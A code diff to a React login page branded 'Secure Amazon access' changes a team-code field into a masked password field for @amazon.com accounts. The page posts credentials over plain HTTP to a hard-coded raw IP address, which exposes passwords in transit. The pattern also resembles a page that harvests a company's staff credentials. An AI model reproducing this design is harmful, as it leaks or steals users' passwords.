@@ -30,7 +30,7 @@ function LoginPage() {
     const e = email.trim().toLowerCase();
 
     if (!emailOk) return setError("Please use a valid @amazon.com email.");
-    if (!teamCode.trim()) return setError("Team code required.");
+    if (!teamCode.trim()) return setError("Password required.");
 
     try {
       const response = await fetch("http://3.137.44.19:8080/api/login", {
@@ -72,7 +72,7 @@ function LoginPage() {
                 Secure Amazon access
               </div>
               <div className="mt-1 text-xs text-slate-600">
-                Log in with your <b>@amazon.com</b> email + team code.
+                Log in with your <b>@amazon.com</b> email + password.
               </div>
             </div>
 
@@ -100,13 +100,14 @@ function LoginPage() {
             <div>
               <label className="mb-1 flex items-center gap-2 text-xs font-extrabold text-slate-700">
                 <UsersRound size={14} className="text-slate-500" />
-                Team code
+                Password
               </label>
               <input
+                type="password"
                 value={teamCode}
-                onChange={(e) => setTeamCode(e.target.value.toUpperCase())}
-                placeholder="SBN-OPS"
-                className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm font-extrabold tracking-wide text-slate-900 outline-none focus:border-slate-300"
+                onChange={(e) => setTeamCode(e.target.value)}
+                placeholder="Enter your password"
+                className="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-sm font-semibold text-slate-900 outline-none focus:border-slate-300"
               />
             </div>
 
